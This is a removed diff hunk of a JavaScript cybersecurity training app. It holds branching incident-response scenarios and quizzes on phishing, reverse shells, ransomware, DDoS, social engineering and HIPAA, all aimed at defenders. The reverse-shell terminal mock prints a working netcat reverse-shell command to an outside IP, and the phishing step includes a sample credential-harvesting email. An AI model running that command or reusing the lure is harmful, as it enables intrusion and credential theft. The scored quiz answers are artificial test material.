-        timeStamp: 'Day 1, 02:00 PM',
-        threatLevel: 3,
-        situation: "Jake was tipped off by access revocation. He wiped his work laptop and submitted resignation via email 30 minutes later. His personal devices are off network. HR finds he also had a competing job offer. Evidence preservation is now at risk.",
-        question: "Evidence may be destroyed. What's your priority?",
-        choices: [
-          { text: "Preserve all server-side logs, DLP records, email archives before they're overwritten", tag: "Server-side preservation", outcome: "Correct. Even if endpoint is wiped, server-side logs (DLP, SIEM, email) capture the activity. Preserve immediately.", points: 35, next: "n3_monitor" },
-          { text: "File a police report immediately for theft of trade secrets", tag: "Law enforcement", outcome: "Possible but premature without preserved evidence. Gather and preserve evidence first before law enforcement.", points: 15, next: "n3_monitor" },
-          { text: "Attempt to recover deleted files from Jake's work laptop", tag: "Forensic recovery", outcome: "Laptop forensics is valuable — but server-side logs are more reliable. Do both, prioritize servers.", points: 20, next: "n3_monitor" },
-          { text: "Preserve all logs + forensic image of work laptop + legal hold notice", tag: "Comprehensive preservation", outcome: "Excellent. Legal hold + forensic images + server logs creates the complete evidence package.", points: 40, next: "n3_monitor" }
-        ]
-      },
-      n3_monitor: {
-        timeStamp: 'Day 5',
-        threatLevel: 2,
-        situation: "Enhanced monitoring is active. Legal hold issued. DLP captures Jake attempting to email source code repository credentials to a personal Gmail account. This is the smoking gun. Legal wants to act now.",
-        question: "Jake just attempted to email credentials externally. What do you do?",
-        choices: [
-          { text: "Block the email, preserve the evidence, and brief Legal immediately for termination", tag: "Block + legal action", outcome: "Correct sequence. Block the data loss, preserve the evidence, and hand off to Legal for formal action.", points: 40, next: "n4_final" },
-          { text: "Let the email go through so you have undeniable proof", tag: "Let it send", outcome: "Never let data exfiltration succeed as an evidence strategy. Block the transfer and use the attempt as evidence.", points: 0, next: "n4_final" },
-          { text: "Confront Jake now with the evidence", tag: "Direct confrontation", outcome: "HR and Legal should lead any confrontation. Security handles containment; Legal/HR handle the employee action.", points: 15, next: "n4_final" },
-          { text: "Block email + preserve + brief Legal + ensure offboarding plan is ready for immediate execution", tag: "Full coordinated response", outcome: "Excellent. Coordinate the technical response with immediate offboarding readiness.", points: 45, next: "n4_final" }
-        ]
-      },
-      n3_nomonitor: {
-        timeStamp: 'Day 5',
-        threatLevel: 3,
-        situation: "No additional monitoring. Jake has been copying additional files daily. Today he emailed himself the production database credentials and API keys. He departs in 1 week.",
-        question: "Massive data exfiltration discovered. How do you respond?",
-        choices: [
-          { text: "Immediately rotate ALL API keys, database credentials, and shared secrets", tag: "Credential rotation", outcome: "Critical. Exfiltrated credentials are useless if rotated immediately. Do this now regardless of other actions.", points: 35, next: "n4_final" },
-          { text: "Terminate Jake effective immediately and revoke all access", tag: "Termination", outcome: "Necessary, but rotating the credentials he already has is equally urgent.", points: 20, next: "n4_final" },
-          { text: "Both: immediate termination AND immediate credential rotation across all affected systems", tag: "Terminate + rotate", outcome: "Correct. Both must happen simultaneously — termination and credential rotation are equally urgent.", points: 40, next: "n4_final" },
-          { text: "Monitor his personal email to see what he does with the credentials", tag: "Monitor personal email", outcome: "Illegal without proper legal authority. And passive monitoring while credentials are live is dangerous.", points: 0, next: "n4_final" }
-        ]
-      },
-      n4_final: {
-        timeStamp: 'Week 2',
-        threatLevel: 1,
-        situation: "Jake is terminated. All credentials rotated. Now: prevent this from happening again. What long-term control addresses insider threats most effectively?",
-        question: "Which combination of controls BEST mitigates insider threat risk going forward?",
-        choices: [
-          { text: "DLP + UEBA (User Entity Behavior Analytics) + least privilege + regular access reviews", tag: "Layered insider controls", outcome: "Perfect. DLP catches data movement, UEBA detects behavioral anomalies early, least privilege limits blast radius, access reviews catch stale permissions.", points: 40, next: "terminal_good" },
-          { text: "Background checks on all employees", tag: "Background checks", outcome: "Useful at hiring but doesn't address ongoing insider risk from trusted long-term employees.", points: 10, next: "terminal_partial" },
-          { text: "Block all USB devices across the organization", tag: "USB blocking", outcome: "Addresses one channel but determined insiders use email, cloud storage, or other methods. Not comprehensive.", points: 20, next: "terminal_partial" },
-          { text: "Separation of duties + mandatory vacation policy + access reviews + DLP", tag: "Complementary controls", outcome: "Excellent combination. Mandatory vacation surfaces hidden fraud; separation of duties prevents single-person abuse.", points: 45, next: "terminal_good" }
-        ]
-      },
-      terminal_good: { isTerminal: true, terminalType: 'good', message: "Insider threat contained with evidence preserved. Termination executed cleanly with legal documentation. Credentials rotated. Long-term controls prevent recurrence. Case may proceed to legal action." },
-      terminal_partial: { isTerminal: true, terminalType: 'partial', message: "Threat addressed but process had gaps. Some evidence risk, possible legal exposure from handling missteps. Controls added but coverage incomplete." },
-      terminal_bad: { isTerminal: true, terminalType: 'bad', message: "Significant data loss. Evidence compromised. Credentials exposed with unknown extent of exfiltration. Legal action difficult without clean evidence chain. Recommend external IR and legal counsel." }
-    }
-  },
-
-  cloud_misconfiguration: {
-    id: 'cloud_misconfiguration',
-    title: 'Cloud Misconfiguration',
-    roles: 'Cloud Security Engineer / IR Lead',
-    intro: "A security researcher just emailed your security team: 'Your S3 bucket at acme-customer-data-prod is publicly accessible. I found 52,000 customer records including names, emails, SSNs, and credit card numbers. I'm giving you 48 hours before I post this publicly.'",
-    nodes: {
-      start: {
-        timeStamp: 'Hour 0',
-        threatLevel: 3,
-        situation: "S3 bucket confirmed publicly accessible. CloudTrail logs show the bucket has been public for 23 days. GetObject requests from unknown IPs total 847 in that period — someone has been downloading data. 52,000 customer records exposed: PII + payment data. GDPR and PCI DSS implications.",
-        question: "What is your ABSOLUTE FIRST action?",
-        choices: [
-          { text: "Immediately set the S3 bucket to private / enable Block Public Access", tag: "Remediate immediately", outcome: "Correct first step. Stop the bleeding. Every second it remains public is additional exposure.", points: 35, next: "n2_secured" },
-          { text: "Notify customers immediately before doing anything else", tag: "Notify first", outcome: "Notification is critical but you must stop the exposure first. Notifying before remediation leaves data exposed longer.", points: 10, next: "n2_secured" },
-          { text: "Delete the S3 bucket entirely", tag: "Delete bucket", outcome: "Deleting the bucket destroys evidence and disrupts business. Block public access instead.", points: 5, next: "n2_partial" },
-          { text: "Block public access AND immediately download CloudTrail logs before they roll over", tag: "Remediate + preserve logs", outcome: "Excellent. Block access immediately while preserving the evidence of who accessed it.", points: 45, next: "n2_secured" }
-        ]
-      },
-      n2_secured: {
-        timeStamp: 'Hour 1',
-        threatLevel: 2,
-        situation: "Bucket secured. CloudTrail analysis shows 847 GetObject requests from 12 unique IP addresses over 23 days. Several IPs resolve to known data broker infrastructure. Attacker also sent similar emails to competitors last month — this may be extortion.",
-        question: "A security researcher is threatening to publish if you don't respond in 48 hours. How do you handle them?",
-        choices: [
-          { text: "Engage the researcher professionally, thank them, ask for details of what they accessed", tag: "Responsible disclosure", outcome: "Correct approach. Treat this as responsible disclosure. Get details of what was accessed to understand scope.", points: 35, next: "n3_scope" },
-          { text: "Ignore them — they're just a hacker trying to extort you", tag: "Ignore", outcome: "Wrong. Even if their motives are mixed, they have information you need about the breach scope.", points: 0, next: "n3_scope" },
-          { text: "Have Legal send a cease-and-desist letter threatening prosecution", tag: "Legal threat", outcome: "Bad move. Threatening researchers who reported a valid vulnerability creates PR disaster and discourages future disclosure.", points: 5, next: "n3_scope" },
-          { text: "Engage researcher + notify your own Legal team + begin breach notification assessment simultaneously", tag: "Coordinated response", outcome: "Perfect. Professional engagement with researcher, legal counsel involved, and breach notification process started.", points: 45, next: "n3_scope" }
-        ]
-      },
-      n2_partial: {
-        timeStamp: 'Hour 1',
-        threatLevel: 3,
-        situation: "Bucket secured but evidence handling suboptimal. CloudTrail shows 847 downloads. Legal is engaged. Researcher claims to have a copy of the full dataset.",
-        question: "How do you determine the full scope of what was accessed?",
-        choices: [
-          { text: "Analyze CloudTrail S3 access logs to identify all GetObject requests and source IPs", tag: "Log analysis", outcome: "Correct. CloudTrail provides the complete access history. Analyze every GetObject request.", points: 35, next: "n3_scope" },
-          { text: "Assume all 52,000 records were accessed by all 12 IPs", tag: "Assume worst case", outcome: "Prudent for notification purposes, but also do the log analysis to get the actual scope.", points: 20, next: "n3_scope" },
-          { text: "Only count downloads from suspicious IPs, ignore internal access", tag: "Selective analysis", outcome: "Incomplete. All external access should be investigated, not just IPs you pre-judge as suspicious.", points: 10, next: "n3_scope" },
-          { text: "Engage AWS directly for forensic assistance", tag: "AWS support", outcome: "AWS support can help but you have direct access to CloudTrail — start there immediately.", points: 15, next: "n3_scope" }
-        ]
-      },
-      n3_scope: {
-        timeStamp: 'Hour 6',
-        threatLevel: 2,
-        situation: "Scope confirmed: all 52,000 records were accessible; CloudTrail confirms at least 3,400 unique records definitively accessed. Payment card data included. This triggers PCI DSS breach notification AND state/GDPR data protection laws.",
-        question: "What is the GDPR notification deadline for reporting this breach to regulators?",
-        choices: [
-          { text: "72 hours from discovery of the breach", tag: "72 hours", outcome: "Correct. GDPR Article 33 requires notification to the supervisory authority within 72 hours of becoming aware of the breach.", points: 40, next: "n4_notify" },
-          { text: "30 days from discovery", tag: "30 days", outcome: "Incorrect. 30 days is common in US state laws. GDPR is 72 hours — much faster.", points: 10, next: "n4_notify" },
-          { text: "60 days from discovery", tag: "60 days", outcome: "Incorrect. 60 days is HIPAA. GDPR requires 72 hours.", points: 5, next: "n4_notify" },
-          { text: "Immediately — same day as discovery", tag: "Immediate", outcome: "Close but the formal requirement is within 72 hours. Immediate is better than late, but 72hr is the legal standard.", points: 25, next: "n4_notify" }
-        ]
-      },
-      n4_notify: {
-        timeStamp: 'Hour 24',
-        threatLevel: 1,
-        situation: "Regulators notified within 72 hours. Customer notification in progress. Root cause identified: a developer set the bucket to public during a debugging session 23 days ago and never reverted it. No CSPM tool detected the change.",
-        question: "Which technical control would have PREVENTED this misconfiguration from persisting for 23 days?",
-        choices: [
-          { text: "Cloud Security Posture Management (CSPM) with real-time misconfiguration alerts", tag: "CSPM", outcome: "Perfect. CSPM continuously scans for misconfigurations and alerts immediately when a bucket goes public.", points: 45, next: "terminal_good" },
-          { text: "Enable AWS S3 Block Public Access at the ACCOUNT level (not just bucket level)", tag: "Account-level block", outcome: "Excellent preventive control. Account-level Block Public Access prevents any bucket from being made public.", points: 45, next: "terminal_good" },
-          { text: "Code reviews before any infrastructure changes", tag: "Code review", outcome: "Good process control but doesn't catch manual console changes made during debugging.", points: 20, next: "terminal_partial" },
-          { text: "Both: AWS account-level Block Public Access + CSPM alerts as compensating control", tag: "Defense in depth", outcome: "Best answer. Prevention (account-level block) + detection (CSPM) = defense in depth for cloud misconfigurations.", points: 50, next: "terminal_good" }
-        ]
-      },
-      terminal_good: { isTerminal: true, terminalType: 'good', message: "Breach contained and disclosed within legal requirements. Root cause addressed. CSPM and preventive controls deployed. Customer trust impact minimized through rapid response and transparent communication." },
-      terminal_partial: { isTerminal: true, terminalType: 'partial', message: "Breach handled but some process gaps. Notification timelines met. Controls added but root cause prevention incomplete. Regulatory scrutiny likely." },
-      terminal_bad: { isTerminal: true, terminalType: 'bad', message: "Significant handling failures. Late notification, evidence gaps, or poor researcher engagement created additional legal and reputational risk on top of the original breach." }
-    }
-  }
-};
-
-// ════════════════════════════════════════════════
-// CYBER SIMULATIONS ENGINE (was cyber-simulations.js)
-// ════════════════════════════════════════════════
-const SIM_DATA = {
-  phishing: {
-    title: 'Phishing Detection',
-    context: 'You are a Security Analyst at MedCorp. A user forwarded an email claiming to be from "IT Support." Your job: analyze the indicators and decide the correct response.',
-    steps: [
-      {
-        type: 'email',
-        from: 'it-support@medcorp-helpdesk.net',
-        fromDisplay: 'IT Support <it-support@medcorp-helpdesk.net>',
-        to: 'j.williams@medcorp.com',
-        subject: 'URGENT: Your Account Will Be Suspended in 24 Hours',
-        body: `Dear Employee,
-
-We have detected unusual login activity on your account. To prevent suspension, you must verify your identity immediately.
-
-Click here to verify: http://medcorp-account-verify.ru/login
-
-You MUST complete this within 24 hours or your account will be permanently disabled.
-
-— IT Support Team
-MedCorp IT Department`,
-        suspiciousFields: ['fromDisplay', 'body'],
-        question: 'Which indicators suggest this is a phishing email?',
-        choices: [
-          { text: 'Domain mismatch: real domain is medcorp.com but email came from medcorp-helpdesk.net', correct: true, feedback: 'Correct! The sender domain medcorp-helpdesk.net is NOT the corporate domain medcorp.com — classic domain spoofing.' },
-          { text: 'The link goes to a .ru domain (Russia), not medcorp.com', correct: true, feedback: 'Correct! Legitimate corporate IT would never send you to a .ru domain for account verification.' },
-          { text: 'Urgent language and artificial deadline creates pressure to act without thinking', correct: true, feedback: 'Correct! Urgency and fear tactics are the hallmark of social engineering attacks.' },
-          { text: 'The email was sent during business hours', correct: false, feedback: 'Business hours is not a phishing indicator. Phishing emails can arrive any time.' }
-        ],
-        correctCount: 3,
-        explanation: 'Three indicators: domain mismatch, suspicious link domain (.ru), and urgency/pressure tactics. Always check the actual sender domain, hover over links before clicking, and be skeptical of urgent account-related requests.'
-      },
-      {
-        type: 'question',
-        question: 'A user already clicked the link and entered their credentials. What is your FIRST action?',
-        choices: [
-          { text: 'Send an awareness email to all staff about the phishing campaign', correct: false, feedback: 'Important but not first. The compromised account needs immediate action.' },
-          { text: 'Immediately reset the user's password and revoke all active sessions', correct: true, feedback: 'Correct! Stop the attacker from using the stolen credentials immediately.' },
-          { text: 'Block the phishing domain at the email gateway and web proxy', correct: false, feedback: 'Also necessary, but the compromised account is the more urgent priority.' },
-          { text: 'Wait to confirm attacker activity before acting', correct: false, feedback: 'Never wait. Compromised credentials = immediate account action required.' }
-        ],
-        explanation: 'When credentials are compromised, the immediate priority is account lockdown: reset password + revoke all active sessions (kill tokens). Then block the domain and notify other users.'
-      }
-    ]
-  },
-  incident: {
-    title: 'Incident Response',
-    context: 'You are an Incident Responder at a financial institution. A server is showing signs of compromise. Analyze the terminal output and make the right calls.',
-    steps: [
-      {
-        type: 'terminal',
-        lines: [
-          { type: 'prompt', text: 'analyst@FINBANK-SOC:~$' },
-          { type: 'command', text: 'netstat -an | grep ESTABLISHED' },
-          { type: 'output', text: 'tcp  0  0  10.0.0.45:443    203.0.113.99:52341  ESTABLISHED' },
-          { type: 'output', text: 'tcp  0  0  10.0.0.45:443    198.51.100.77:61102  ESTABLISHED' },
-          { type: 'output', text: 'tcp  0  0  10.0.0.45:4444    185.220.101.55:39841  ESTABLISHED' },
-          { type: 'warning', text: 'tcp  0  0  10.0.0.45:4444    185.220.101.55:39841  ESTABLISHED  ← SUSPICIOUS' },
-          { type: 'prompt', text: 'analyst@FINBANK-SOC:~$' },
-          { type: 'command', text: 'ps aux | grep -i "suspicious"' },
-          { type: 'output', text: 'root  4821  99.2  0.1  nc -e /bin/sh 185.220.101.55 4444' },
-          { type: 'error', text: '← ACTIVE REVERSE SHELL DETECTED' }
-        ],
-        question: 'The terminal shows a reverse shell active on port 4444. What does this mean?',
-        choices: [
-          { text: 'An attacker has remote command execution on this server via a reverse shell', correct: true, feedback: 'Correct! "nc -e /bin/sh" is a classic reverse shell — the server is calling out to the attacker's machine and giving them a shell.' },
-          { text: 'The server has an open port 4444 for legitimate monitoring', correct: false, feedback: 'Port 4444 is not a standard monitoring port. The process "nc -e /bin/sh" is a netcat reverse shell.' },
-          { text: 'The server is performing a vulnerability scan of the attacker's IP', correct: false, feedback: 'No — the server is the victim here. It's connecting outbound to an external IP and handing over a shell.' },
-          { text: 'This is normal outbound traffic from the banking application', correct: false, feedback: 'nc -e /bin/sh executing as root and calling an external IP is never normal traffic.' }
-        ],
-        explanation: '"nc -e /bin/sh" is netcat with -e (execute) shell — a textbook reverse shell. The compromised server connects OUT to the attacker at 185.220.101.55:4444, bypassing inbound firewall rules. The attacker now has interactive root shell access.'
-      },
-      {
-        type: 'question',
-        question: 'You confirmed an active reverse shell with root access. What is the correct sequence of actions?',
-        choices: [
-          { text: '1. Kill the netcat process. 2. Isolate server. 3. Preserve forensic image. 4. Investigate how attacker got in.', correct: true, feedback: 'Correct! Kill active threat → isolate → preserve evidence → investigate root cause.' },
-          { text: '1. Immediately wipe and reinstall the OS. 2. Restore from backup. 3. Return to service.', correct: false, feedback: 'Wiping destroys all forensic evidence. You cannot determine how the attacker got in or what they accessed.' },
-          { text: '1. Monitor the attacker's activity to gather intelligence. 2. Act after 24 hours.', correct: false, feedback: 'Too risky. An attacker with root access can cause catastrophic damage in minutes, not 24 hours.' },
-          { text: '1. Notify management. 2. Wait for authorization. 3. Then isolate.', correct: false, feedback: 'A live reverse shell is an active emergency. Isolate first, notify simultaneously — don't wait for authorization to cut off an active attack.' }
-        ],
-        explanation: 'NIST IR lifecycle: Contain first (kill shell + isolate) → Preserve evidence (forensic image) → Eradicate → Recover → Lessons Learned. Never wipe before imaging.'
-      }
-    ]
-  },
-  malware: {
-    title: 'Malware Analysis',
-    context: 'A workstation in accounting is behaving strangely. High CPU, unusual network connections, and users report files are disappearing. Analyze the indicators to identify and respond to the threat.',
-    steps: [
-      {
-        type: 'terminal',
-        lines: [
-          { type: 'prompt', text: 'C:\> tasklist /v' },
-          { type: 'output', text: 'svchost.exe         1284  Services   0  23,456 K' },
-          { type: 'output', text: 'explorer.exe        2048  Console    1  48,234 K' },
-          { type: 'warning', text: 'svch0st.exe         3891  Console    1  97,234 K  ← HIGH CPU' },
-          { type: 'error', text: 'Connecting to: 192.168.1.5, 10.0.0.20, 10.0.0.31, 10.0.0.44...' },
-          { type: 'prompt', text: 'C:\> dir %TEMP%' },
-          { type: 'output', text: 'svchost_update.exe   2,048,000   [UNSIGNED]' },
-          { type: 'output', text: 'winlog.bat           1,024       [UNSIGNED]' },
-          { type: 'warning', text: 'All files in C:\Users\jsmith\Documents changed to .encrypted extension' }
-        ],
-        question: 'Based on these indicators, what type of malware is this most likely?',
-        choices: [
-          { text: 'Ransomware — encrypting files and spreading to other network hosts', correct: true, feedback: 'Correct! File encryption (.encrypted extension) + network scanning behavior = active ransomware infection spreading via the network.' },
-          { text: 'Adware — displaying advertisements and slowing the system', correct: false, feedback: 'Adware doesn't encrypt files or scan the network aggressively.' },
-          { text: 'Keylogger — recording keystrokes silently', correct: false, feedback: 'A keylogger would be silent and low CPU. This is active, spreading, and encrypting.' },
-          { text: 'Rootkit — hiding malware from the OS', correct: false, feedback: 'Rootkits are stealthy. This malware is very active and visible in process list.' }
-        ],
-        explanation: '"svch0st.exe" (typosquatted process name) is encrypting files and actively scanning the network for lateral movement. The .encrypted extension confirms ransomware. The network scanning to 10.0.0.x hosts means it's attempting to spread.'
-      },
-      {
-        type: 'question',
-        question: 'The ransomware is actively spreading across the network. What is the priority action?',
-        choices: [
-          { text: 'Isolate the infected workstation from the network immediately', correct: true, feedback: 'Correct! Network isolation stops lateral movement. Every second it stays connected it tries to infect more hosts.' },
-          { text: 'Run antivirus on the infected machine to remove the ransomware', correct: false, feedback: 'AV won't stop active encryption and may trigger accelerated behavior. Isolate first.' },
-          { text: 'Back up the encrypted files before they're overwritten', correct: false, feedback: 'Encrypted files have already been changed — backing them up doesn't help unless you have the key. Isolation is the priority.' },
-          { text: 'Try to pay the ransom quickly to get the decryption key before more damage', correct: false, feedback: 'Never pay as the first response. Isolate to stop spread, then assess recovery options (clean backups first).' }
-        ],
-        explanation: 'Active ransomware spreading = network isolation is the #1 priority. This stops lateral movement. Then: assess backups, check for decryptors, consider ransom only as last resort after all other options exhausted.'
-      }
-    ]
-  },
-  network: {
-    title: 'Network Security',
-    context: 'You are a Network Security Analyst. The firewall is logging unusual traffic patterns. Review the logs and identify the attack type and appropriate response.',
-    steps: [
-      {
-        type: 'terminal',
-        lines: [
-          { type: 'output', text: '--- FIREWALL LOG EXCERPT ---' },
-          { type: 'output', text: 'SRC: 45.142.212.100  DST: 10.0.0.1  PORT: 80   PACKETS: 1' },
-          { type: 'output', text: 'SRC: 45.142.212.101  DST: 10.0.0.1  PORT: 80   PACKETS: 1' },
-          { type: 'output', text: 'SRC: 45.142.212.102  DST: 10.0.0.1  PORT: 80   PACKETS: 1' },
-          { type: 'warning', text: '... [43,217 similar entries in 60 seconds] ...' },
-          { type: 'error', text: 'SRC: 45.142.212.x/24  DST: 10.0.0.1  RATE: 723/sec  BANDWIDTH: 2.1Gbps' },
-          { type: 'output', text: 'Web server CPU: 100%  |  Response time: timeout  |  Status: DOWN' }
-        ],
-        question: 'What type of attack is shown in these firewall logs?',
-        choices: [
-          { text: 'Distributed Denial of Service (DDoS) — volumetric HTTP flood', correct: true, feedback: 'Correct! Thousands of source IPs sending requests simultaneously to take down the web server is a classic DDoS attack.' },
-          { text: 'Port scanning — attacker mapping network services', correct: false, feedback: 'Port scanning is low volume and methodical. This is 43,000+ requests in 60 seconds to a single port.' },
-          { text: 'SQL injection — attacker sending malicious database queries', correct: false, feedback: 'SQLi targets the application layer with crafted payloads. This is network-layer volumetric flooding.' },
-          { text: 'ARP poisoning — attacker redirecting local network traffic', correct: false, feedback: 'ARP poisoning is a LAN-level Layer 2 attack. This traffic is coming from external IPs over port 80.' }
-        ],
-        explanation: '43,000+ requests per minute from distributed IPs (45.142.212.0/24) causing 100% CPU and server downtime = volumetric HTTP DDoS. The distributed source IPs (DDoS vs DoS single source) and 2.1Gbps bandwidth are key indicators.'
-      },
-      {
-        type: 'question',
-        question: 'The DDoS attack is bringing down the web server. Which response is MOST effective?',
-        choices: [
-          { text: 'Block the entire 45.142.212.0/24 subnet at the perimeter firewall', correct: false, feedback: 'Partially helpful but DDoS traffic typically comes from thousands of different IP ranges, not one subnet.' },
-          { text: 'Activate DDoS mitigation / traffic scrubbing service and enable rate limiting', correct: true, feedback: 'Correct! Traffic scrubbing services (Cloudflare, AWS Shield) filter DDoS traffic before it reaches your network. Rate limiting reduces impact.' },
-          { text: 'Restart the web server to clear the connections', correct: false, feedback: 'Restarting doesn't help — the flood of traffic will immediately bring it down again.' },
-          { text: 'Increase web server resources (more CPU/RAM)', correct: false, feedback: 'Scaling up helps with traffic spikes but won't stop a DDoS — the attacker can always send more traffic.' }
-        ],
-        explanation: 'DDoS mitigation services (Cloudflare, AWS Shield, Akamai) are purpose-built to absorb and filter attack traffic. Rate limiting at the edge reduces impact. Blocking single IP ranges is ineffective for distributed attacks.'
-      }
-    ]
-  },
-  social: {
-    title: 'Social Engineering',
-    context: 'You manage security awareness at a company. Review these scenarios and identify the social engineering technique being used.',
-    steps: [
-      {
-        type: 'question',
-        question: 'An employee receives a call: "Hi, this is Mike from IT. We're seeing errors on your account. I need your password to run a diagnostic." Which attack is this?',
-        choices: [
-          { text: 'Vishing (voice phishing) with impersonation of IT support', correct: true, feedback: 'Correct! A voice call impersonating IT to extract credentials = vishing. IT will never ask for your password.' },
-          { text: 'Smishing — SMS-based phishing attack', correct: false, feedback: 'Smishing is SMS-based. This is a phone call = vishing.' },
-          { text: 'Phishing — fraudulent email attack', correct: false, feedback: 'Phishing is email-based. This is a phone call = vishing.' },
-          { text: 'Pretexting only — no phone element', correct: false, feedback: 'Pretexting is the fabricated scenario (false identity/story). When done via voice, it's also vishing. Both apply, but vishing is more specific.' }
-        ],
-        explanation: 'Vishing = voice phishing. The attacker impersonates IT support and uses a plausible story (pretexting) to request credentials. Security rule: IT will NEVER ask for your password over the phone.'
-      },
-      {
-        type: 'question',
-        question: 'An attacker leaves USB drives labeled "Q4 Salaries - CONFIDENTIAL" in the company parking lot. Employees who plug them in install malware. What type of attack is this?',
-        choices: [
-          { text: 'Baiting — using physical media with enticing labels to deliver malware', correct: true, feedback: 'Correct! Using enticing physical media (USB drives with interesting labels) to trick users into executing malware = baiting.' },
-          { text: 'Tailgating — following someone through a secure door', correct: false, feedback: 'Tailgating is physical access through secured doors. This is USB media dropped in a parking lot.' },
-          { text: 'Watering hole attack — compromising a website targets visit', correct: false, feedback: 'Watering hole compromises websites. This uses physical USB media = baiting.' },
-          { text: 'Shoulder surfing — observing screen or keyboard inputs', correct: false, feedback: 'Shoulder surfing is visual observation. This uses physical media = baiting.' }
-        ],
-        explanation: 'Baiting uses physical media (USB drives, CDs) with enticing labels or promises to trick victims into plugging them in and executing malware. Countermeasure: USB port lockdown (Group Policy), disable AutoRun, employee training.'
-      }
-    ]
-  },
-  compliance: {
-    title: 'Compliance Audit',
-    context: 'You are conducting a compliance review for a healthcare organization subject to HIPAA. Evaluate the scenarios and identify compliance violations and required controls.',
-    steps: [
-      {
-        type: 'question',
-        question: 'During the audit you find: patient records are accessible to all hospital staff regardless of role, including custodial staff. Which HIPAA principle is violated?',
-        choices: [
-          { text: 'Minimum Necessary / Principle of Least Privilege — access should be role-based', correct: true, feedback: 'Correct! HIPAA requires the "minimum necessary" standard — employees should only access PHI required for their specific job function. All-access to custodial staff violates this.' },
-          { text: 'Encryption requirement — all PHI must be encrypted at rest', correct: false, feedback: 'Encryption is required but the scenario describes an access control issue, not an encryption failure.' },
-          { text: 'Audit logging — all PHI access must be logged', correct: false, feedback: 'Audit logging is required but the primary violation here is inappropriate access, not missing logs.' },
-          { text: 'Business Associate Agreement (BAA) requirement', correct: false, feedback: 'BAAs apply to third-party vendors who handle PHI, not internal employee access controls.' }
-        ],
-        explanation: 'HIPAA Minimum Necessary rule: covered entities must limit PHI access to the minimum necessary to accomplish intended purpose. Role-based access control (RBAC) is required — custodial staff have no clinical need to access patient records.'
-      },
-      {
-        type: 'question',
-        question: 'The organization had a laptop stolen. It contained unencrypted PHI for 850 patients. What is the correct breach notification requirement?',
-        choices: [
-          { text: 'Notify affected patients within 60 days AND notify HHS within 60 days (under 500 patients in state)', correct: true, feedback: 'Correct! Under 500 patients in a state: notify individuals AND HHS within 60 days. Annual log submission to HHS.' },
-          { text: 'Only notify HHS — patients do not need to be individually notified for theft', correct: false, feedback: 'Incorrect. Individual notification is required regardless of whether it was theft or accidental disclosure.' },
-          { text: 'Notify within 72 hours — same as GDPR requirement', correct: false, feedback: '72 hours is GDPR. HIPAA is 60 days for individual notification (and HHS for <500/state).' },
-          { text: 'No notification required if the laptop had a password', correct: false, feedback: 'Password protection is not sufficient. HIPAA safe harbor requires encryption. Password-only is not encryption.' }
-        ],
-        explanation: 'HIPAA Breach Notification: < 500 patients in a state = notify individuals within 60 days + submit to HHS annual log. 500+ in a state = also notify media. HIPAA safe harbor from breach notification applies ONLY if PHI was encrypted (not just password-protected).'
-      }
-    ]
-  }
-};
-
-// ── SIM ENGINE STATE ──
-let simState = {
-  scenario: null,
-  stepIndex: 0,
-  score: 0,
-  total: 0,
-  answered: false
-};
-
-function initSimCards() {
-  document.querySelectorAll('#section-sim .scenario-card').forEach(card => {
-    card.style.cursor = 'pointer';
-    card.addEventListener('click', () => launchSim(card.dataset.scenario));
-  });
-}
-
-function launchSim(id) {
-  simState = { scenario: SIM_DATA[id], stepIndex: 0, score: 0, total: 0, answered: false };
-  document.getElementById('simIntroSection').style.display = 'none';
-  const container = document.getElementById('simulationContainer');
-  container.style.display = 'block';
-  container.classList.add('active');
-  renderSimStep();
-}
-
-function renderSimStep() {
-  const { scenario, stepIndex } = simState;
-  const step = scenario.steps[stepIndex];
-  const container = document.getElementById('simulationContainer');
-  const totalSteps = scenario.steps.length;
-
-  let html = `
-    <div class="simulation-header">
-      <div class="sim-title">${scenario.title}</div>
-      <div class="sim-context">${scenario.context}</div>
-    </div>
-    <div class="progress-indicator">
-      ${scenario.steps.map((_, i) => `<div class="progress-dot ${i < stepIndex ? 'completed' : i === stepIndex ? 'active' : ''}"></div>`).join('')}
-    </div>
-  `;
-
-  if (step.type === 'email') {
-    html += `
-      <div class="email-window">
-        <div class="email-header">
-          <div class="email-field"><span class="email-label">FROM:</span><span class="email-value email-suspicious">${step.fromDisplay}</span></div>
-          <div class="email-field"><span class="email-label">TO:</span><span class="email-value">${step.to}</span></div>
-          <div class="email-field"><span class="email-label">SUBJECT:</span><span class="email-value email-suspicious">${step.subject}</span></div>
-        </div>
-        <div class="email-body" style="white-space:pre-line">${step.body}</div>
-      </div>
-    `;
-  } else if (step.type === 'terminal') {
-    html += `<div class="terminal-window">
-      <div class="terminal-header">
-        <div class="terminal-dot dot-red"></div>
-        <div class="terminal-dot dot-yellow"></div>
-        <div class="terminal-dot dot-green"></div>
-        <div class="terminal-title">terminal — analyst session</div>
-      </div>
-      <div class="terminal-content">`;
-    step.lines.forEach((line, i) => {
-      const cls = line.type === 'prompt' ? 'terminal-prompt' : line.type === 'command' ? 'terminal-command' : line.type === 'error' ? 'terminal-error' : line.type === 'warning' ? 'terminal-warning' : 'terminal-output';
-      html += `<div class="terminal-line" style="animation-delay:${i * 0.08}s"><span class="${cls}">${line.text}</span></div>`;
-    });
-    html += `</div></div>`;
-  }
-
-  html += `
-    <div class="question-section" id="simQuestion">
-      <div class="question-text">${step.question}</div>
-      <div class="choices-container" id="simChoices">
-        ${step.choices.map((c, i) => `
-          <button class="choice-btn" onclick="simAnswer(${i})" id="simChoice-${i}">
-            <span class="choice-letter">${['A','B','C','D'][i]}</span>
-            <span class="choice-text">${c.text}</span>
-          </button>`).join('')}
-      </div>
-    </div>
-    <div class="feedback-section" id="simFeedback"></div>
-    <div class="action-buttons">
-      <button class="btn btn-secondary" onclick="simBack()" style="display:${stepIndex > 0 || true ? 'inline-block' : 'none'}">← Back to Scenarios</button>
-      <button class="btn btn-primary" id="simNextBtn" style="display:none" onclick="simNext()">
-        ${stepIndex < totalSteps - 1 ? 'Next Step →' : 'See Results'}
-      </button>
-    </div>
-  `;
-
-  container.innerHTML = html;
-  simState.answered = false;
-}
-
-function simAnswer(choiceIndex) {
-  if (simState.answered) return;
-  simState.answered = true;
-
-  const step = simState.scenario.steps[simState.stepIndex];
-  const choice = step.choices[choiceIndex];
-  const buttons = document.querySelectorAll('.choice-btn');
-
-  buttons.forEach((btn, i) => {
-    btn.disabled = true;
-    if (step.choices[i].correct) btn.classList.add('correct');
-    else if (i === choiceIndex && !choice.correct) btn.classList.add('incorrect');
-  });
-
-  if (choice.correct) simState.score++;
-  simState.total++;
-
